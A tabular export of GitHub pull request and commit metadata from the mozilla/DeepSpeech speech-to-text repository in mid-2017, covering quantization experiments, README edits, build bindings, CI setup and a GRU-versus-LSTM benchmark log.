3669,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,659cac911b9e3ec0f09201590b88650afa3ec587,"WIP: Quantization of model

Fixes #133"
3670,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fbc0f5486c584e906970b4693a4da21c0e77268,Add quantization-dedicated test script
3671,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2880cf98ac8108ab138c0e374b81bfc4a01a3c64,Supporting easy switching between BasicLSTM and BasicRNN
3672,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d4d187101b4a20e456c0b7b51ee4df8b1ddd315,Computing inference time
3673,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ddd0c9ebbfa47699131c3dd91539acf8caa00da,Local/Remote benchmarking tool
3674,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42351b386424d1eb353ff592a4d4707953f63387,WIP: Hacking on RNN/LSTM
3675,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93d925280f57fdc1cd26b780a2afa27c76d8b59f,WIP: Tooling for slow 8-bits investigation
3676,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9c9ad7e78656e614880031c5f947e09183137b73,WIP: Set maxRunTime to 2h
3677,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d41454d40faa5c7e00ed5465aeb23e9c23d94236,WIP: Hacking with AOT/tfcompile
3678,https://api.github.com/repos/mozilla/DeepSpeech/pulls/781,781,Quantize tf1.0.0 distributed tf,Opening PR for hacking purpose :),lissyx,1645737,2017-08-22T12:06:25Z,COLLABORATOR,False,1595,151,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af74851ec1ac351ceb8aeba66b1c6471500ccac1,WIP: CFLAGS/LDFLAGS
3679,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19e1fd0f1103b3528e99543b292fd893e2e6477e,Update README.md
3680,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d0785a4a08b402b9b0e788312c7981e93d213ab,Update README.md
3681,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08dd32369b29b7b584a2443db720915672723297,Update README.md
3682,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e8823d6e477f20331fd13f72682b9b428acf2be,"removing italics

**this commit does basically aim at:**
- *removing italics*

---

**I've done so according to a pre-made suggestion**"
3683,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b3eca24505b1091f4fe2625fe9ef7ee68b052b6d,"removing unnecessary spaces

**This commit does basically aim at**
- *removing unnecessary spaces;*

---

**I've done so so according to a suggestion**"
3684,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,337b2ae4a9c583618884789da4cc80e7cc6c7293,replacing serving by inference
3685,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c20e88d13217a661666c1c9b51c6f6d032719b2,Update README.md
3686,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67db38e8656aa8a3fd6b0c8bd44885555c769401,Update README.md
3687,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ce2a76bc27e91434cebfe820cab98e5ffe902c6,Update README.md
3688,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b7eff97ce9efbcb56a4fb7cb7a9ffeba0eebe9e,Update README.md
3689,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7a8ed5cdc2cc11e77d68075b17d5cc99b870d4f,Update README.md
3690,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41ec77a89cc1d3c9669fc68f0afdf3c29d81e008,Update README.md
3691,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abbd87698a5c18242f55b4bf7479f22d6f65c4e9,Update README.md
3692,https://api.github.com/repos/mozilla/DeepSpeech/pulls/779,779,stylizing the markup of README file,"---

**with this PR, i did basically aim at:**

- *improving the markup styling of the README file;*

---

**my overall intention with this was basically to:**

- **improving the overal UI/UX of of the file;**

---

**by doing so**:

- *make the file easier to be be read;*
- *make the file more cohesive;*

---

**I do understand it if:**

- *the file still needs fixing/tweaking to be merged;*

---",ghost,10137,2017-08-18T18:34:09Z,NONE,False,11,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c883c7c2cf15f64ed0d96f857ed36dc062c919c,Update README.md
3693,https://api.github.com/repos/mozilla/DeepSpeech/pulls/778,778,fixing small issue with rhetorics,,ghost,10137,2017-08-18T17:08:52Z,NONE,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcc014e286ca03245821929f469764627ed66113,fixing small issue with rhetorics
3694,https://api.github.com/repos/mozilla/DeepSpeech/pulls/777,777,Fixed #773,Minor changes to make SWB import work again,kdavis-mozilla,12054740,2017-08-18T10:24:17Z,CONTRIBUTOR,True,3,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee74cf02955a6bc44bb7400e383be90d3378b37f,Fixed #773
3695,https://api.github.com/repos/mozilla/DeepSpeech/pulls/775,775,Dynamic batch size,,tilmankamp,5991088,2017-08-17T08:53:33Z,CONTRIBUTOR,False,503,318,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eae29363a1e446c3364d56e6a52322de060aca01,Dynamic batch size
3696,https://api.github.com/repos/mozilla/DeepSpeech/pulls/775,775,Dynamic batch size,,tilmankamp,5991088,2017-08-17T08:53:33Z,CONTRIBUTOR,False,503,318,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad372b2ccd8725e8853b7fbec5e6d0c6a184acdd,Advanced batch enqueuing
3697,https://api.github.com/repos/mozilla/DeepSpeech/pulls/775,775,Dynamic batch size,,tilmankamp,5991088,2017-08-17T08:53:33Z,CONTRIBUTOR,False,503,318,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ace9b85e649c2a28aafa647a1db9e2350d8ba7eb,Single queue approach; better index logging
3698,https://api.github.com/repos/mozilla/DeepSpeech/pulls/772,772,Update README.website.md,,ghost,10137,2017-08-15T10:21:33Z,NONE,True,7,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e08b08c2ce65860df19130a2c6cd7aa45c20adb1,Update README.website.md
3699,https://api.github.com/repos/mozilla/DeepSpeech/pulls/770,770,Update README.md,,ghost,10137,2017-08-14T21:53:33Z,NONE,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ed7a8e42ab2d40eea4de84fe3cdf393e04a94e6,Update README.md
3700,https://api.github.com/repos/mozilla/DeepSpeech/pulls/768,768,TaskCluster-based training and testing of DeepSpeech,"Fixes #751

Trains a model and schedule C++, Python and NodeJS tests.",lissyx,1645737,2017-08-11T13:12:34Z,COLLABORATOR,True,498,14,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76a93dcdde13d394f3b47f383bf825b9d44ec908,"TaskCluster-based training and testing of DeepSpeech

Fixes #751

Trains a model and schedule C++, Python and NodeJS tests."
3701,https://api.github.com/repos/mozilla/DeepSpeech/pulls/767,767,Add missing Python build dependencies,,lissyx,1645737,2017-08-11T10:13:12Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d220dfa52c8cc48343142fc9d6b62937273bd8b6,Add missing Python build dependencies
3702,https://api.github.com/repos/mozilla/DeepSpeech/pulls/764,764,Python and Node packages,,lissyx,1645737,2017-08-10T09:17:26Z,COLLABORATOR,True,164,22,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f70dcab26a394ac89b831e26fc7dce772cab9c2a,"Building NodeJS packages for Node v4.x, v5.x, v6.x

Fixes #743"
3703,https://api.github.com/repos/mozilla/DeepSpeech/pulls/764,764,Python and Node packages,,lissyx,1645737,2017-08-10T09:17:26Z,COLLABORATOR,True,164,22,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fd1f9ede8111ff3aad0535964df6802b05fc21f9,"Building Python bindings for Py2.7, Py3.4, Py3.5 and Py3.6

Fixes #743"
3704,https://api.github.com/repos/mozilla/DeepSpeech/pulls/757,757,Fix node client.js model.stt() buffer size call,Fixes #756,lissyx,1645737,2017-08-08T14:01:03Z,COLLABORATOR,True,5,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,916f95536f8d44fb8a4b3064b53c1dc72671f070,"Fix node client.js model.stt() buffer size call

Fixes #756"
3705,https://api.github.com/repos/mozilla/DeepSpeech/pulls/750,750,Make native_client/client.py compatible with Py3,Fixes #749,lissyx,1645737,2017-08-03T13:40:15Z,COLLABORATOR,True,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a20d68b3ba5ee98eec769fbcf0e675d5b50234eb,"Make native_client/client.py compatible with Py3

Fixes #749"
3706,https://api.github.com/repos/mozilla/DeepSpeech/pulls/748,748,Don't duplicate spaces in the source text when converting to integer labels,,reuben,477142,2017-08-02T20:01:21Z,MEMBER,True,4,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23fa1f71a5d09462981a504050299a446b653760,Don't duplicate spaces in the source text when converting to integer labels
3707,https://api.github.com/repos/mozilla/DeepSpeech/pulls/745,745,Add scipy and numpy deps to deepspeech python bindings,Fixes #744,lissyx,1645737,2017-07-26T09:02:27Z,COLLABORATOR,True,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f45a6b168ba66f224e3c59de499856f4828e358,"Add scipy and numpy deps to deepspeech python bindings

Fixes #744"
3708,https://api.github.com/repos/mozilla/DeepSpeech/pulls/742,742,Invalid link order result in linker failure #735,,lissyx,1645737,2017-07-26T08:50:43Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a55aaf2d11868186c749922954368c06aa6c025,Invalid link order result in linker failure #735
3709,https://api.github.com/repos/mozilla/DeepSpeech/pulls/732,732,delete non-exist import module,delete unused and non-exist module data_set_helper,gardenia22,3919482,2017-07-19T08:37:29Z,CONTRIBUTOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,541aead796807a2430ba9a4bef43b27657af4464,delete non-exist import
3710,https://api.github.com/repos/mozilla/DeepSpeech/pulls/731,731,Build bindings,,lissyx,1645737,2017-07-19T08:26:58Z,COLLABORATOR,True,153,47,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18572b78a71bd1be0d751670906899a4fedc8c30,"Building DeepSpeech for OSX

Fixes #754"
3711,https://api.github.com/repos/mozilla/DeepSpeech/pulls/731,731,Build bindings,,lissyx,1645737,2017-07-19T08:26:58Z,COLLABORATOR,True,153,47,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2c6050b75844309a46902097419a9fba3dda5d9,"Switch to Tensorflow master home.tar.xz artifact

Fixes #754"
3712,https://api.github.com/repos/mozilla/DeepSpeech/pulls/718,718,fix bug in feeding.py,"There was a small bug in feeding.py where i got
 
`NameError: global name 'files' is not defined`

when running run-librivox.sh",sungsulim,11016779,2017-07-14T00:37:34Z,NONE,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,403fb0bc262506f16f762f23596f49ee2014d6a3,fix bug in feeding.py
3713,https://api.github.com/repos/mozilla/DeepSpeech/pulls/717,717,Fix #715; removed wrong and unused import,,tilmankamp,5991088,2017-07-13T12:30:07Z,CONTRIBUTOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6155e6e9c7cf41fe6e06db82b83e4ef17b22175e,Fix #715; removed wrong and unused import
3714,https://api.github.com/repos/mozilla/DeepSpeech/pulls/716,716,Add importer for voxforge dataset,"Add an importer for [voxforge](http://www.voxforge.org/home) dataset(~118 hour), use 1/100 for test, 1/100 for dev.

",gardenia22,3919482,2017-07-13T12:25:55Z,CONTRIBUTOR,True,111,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a1a71af4c03bf34d4aca336e1b3c9a8c36b353cc,add importer for voxforge dataset
3715,https://api.github.com/repos/mozilla/DeepSpeech/pulls/716,716,Add importer for voxforge dataset,"Add an importer for [voxforge](http://www.voxforge.org/home) dataset(~118 hour), use 1/100 for test, 1/100 for dev.

",gardenia22,3919482,2017-07-13T12:25:55Z,CONTRIBUTOR,True,111,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f152139a713abe3a7abdba521e9450c19988159,add importer for voxforge data
3716,https://api.github.com/repos/mozilla/DeepSpeech/pulls/716,716,Add importer for voxforge dataset,"Add an importer for [voxforge](http://www.voxforge.org/home) dataset(~118 hour), use 1/100 for test, 1/100 for dev.

",gardenia22,3919482,2017-07-13T12:25:55Z,CONTRIBUTOR,True,111,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,814d1e167fa82c9d9b9268999c781605f040aee8,add importer for voxforge data
3717,https://api.github.com/repos/mozilla/DeepSpeech/pulls/716,716,Add importer for voxforge dataset,"Add an importer for [voxforge](http://www.voxforge.org/home) dataset(~118 hour), use 1/100 for test, 1/100 for dev.

",gardenia22,3919482,2017-07-13T12:25:55Z,CONTRIBUTOR,True,111,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,953c2d3a42961168bcfdb829268d786d9ac525ce,add BeautifulSoup in requirement
3718,https://api.github.com/repos/mozilla/DeepSpeech/pulls/709,709,Fix #360; Compare SortaGrad vs Existing Curriculum Learning,@reuben : Can you have a look at this?,andi4191,14961916,2017-07-11T18:16:41Z,CONTRIBUTOR,False,23,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,053ed71d9e5d135c3b52579fa10fbdfc7cf0a860,Fix #360; Compare SortaGrad vs Existing Curriculum Learning
3719,https://api.github.com/repos/mozilla/DeepSpeech/pulls/708,708,Fix #695; Checkpoint is not resuming from left off point,"@tilmankamp , @kdavis-mozilla : Can you have a look at this?",andi4191,14961916,2017-07-10T18:16:35Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0a9e9da8e4168a5dd83d4c77ea8b7eefecbd3b4,Fix #695; Checkpoint is not resuming from left off point
3720,https://api.github.com/repos/mozilla/DeepSpeech/pulls/701,701,Fix #361; Compare GRU's vs Current LSTM,"**Note: This branch is not intended for merging into the master branch. It is simply a part of benchmark variation comparison. Hence, the branch name is prefixed with test_**

Test with GRU cell instead of Current LSTM cell

GRU cell results:

Dataset used: TED
Training Time: 8:13:07 (Lower than usual which is expected as compared to LSTMs)
No. of Train epochs: 10
GPU instances used: 4

I FINISHED Optimization - training time: 8:13:07
I Test of Epoch 10 - WER: 0.530035, loss: 94.745821317, mean edit distance: 0.254709
I --------------------------------------------------------------------------------
I WER: 0.200000, loss: 5.857036, mean edit distance: 0.050000
I  - src: ""to do that dont look""
I  - res: ""o do that dont look""
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 4.066966, mean edit distance: 0.111111
I  - src: ""and i say""
I  - res: ""and i saw""
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 4.303623, mean edit distance: 0.090909
I  - src: ""yes he said""
I  - res: ""yes the said""
I --------------------------------------------------------------------------------
I WER: 0.333333, loss: 5.691000, mean edit distance: 0.222222
I  - src: ""and i say""
I  - res: ""and i save""
I --------------------------------------------------------------------------------
I WER: 0.500000, loss: 4.931426, mean edit distance: 0.285714
I  - src: ""sort of""
I  - res: ""sort a""
I --------------------------------------------------------------------------------
I WER: 0.500000, loss: 5.437888, mean edit distance: 0.133333
I  - src: ""not intensively""
I  - res: ""not intensely""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 1.898744, mean edit distance: 0.333333
I  - src: ""and""
I  - res: ""nd""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 2.118078, mean edit distance: 0.500000
I  - src: ""so""
I  - res: ""of""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 2.586474, mean edit distance: 0.500000
I  - src: ""so""
I  - res: ""o""
I --------------------------------------------------------------------------------
I WER: 1.000000, loss: 3.953010, mean edit distance: 0.500000
I  - src: ""so""
I  - res: ""o""
I --------------------------------------------------------------------------------


Will post the results from Current LSTM cell test run after a couple of more benchmark variation algorithm test runs.

",andi4191,14961916,2017-07-07T00:30:32Z,CONTRIBUTOR,False,74,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d012bebf41a8ab265d461dc8b8f86867a4ca506,Fix #361; Compare GRU's vs Current LSTM
3721,https://api.github.com/repos/mozilla/DeepSpeech/pulls/700,700,Fix #698 #699; cleanup and preparation step for dynamic batch size refactoring," - Restructured data_set_helpers
 - One queue per GPU
 - Also fixes two long-term issues/annoyances",tilmankamp,5991088,2017-07-06T15:37:41Z,CONTRIBUTOR,True,235,227,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,125db9dd8666e014ff343ca96bc0b83cfa131c38,Fix #698 #699; cleanup and preparation step for dynamic batch size refactoring
3722,https://api.github.com/repos/mozilla/DeepSpeech/pulls/697,697,Fix #693; corrections for several Fisher test samples,,tilmankamp,5991088,2017-07-05T10:01:07Z,CONTRIBUTOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0260b2fbeeadd40ccaf2e9d6c9a0cc7f3ce388aa,Fix #693; corrections for several Fisher test samples
3723,https://api.github.com/repos/mozilla/DeepSpeech/pulls/696,696,Fix #678; copying keep directory into right target directory,,tilmankamp,5991088,2017-07-05T08:31:14Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63d528bac74e0344509b0788dcff2862b15e9fb8,Fix #678; copying keep directory into right target directory
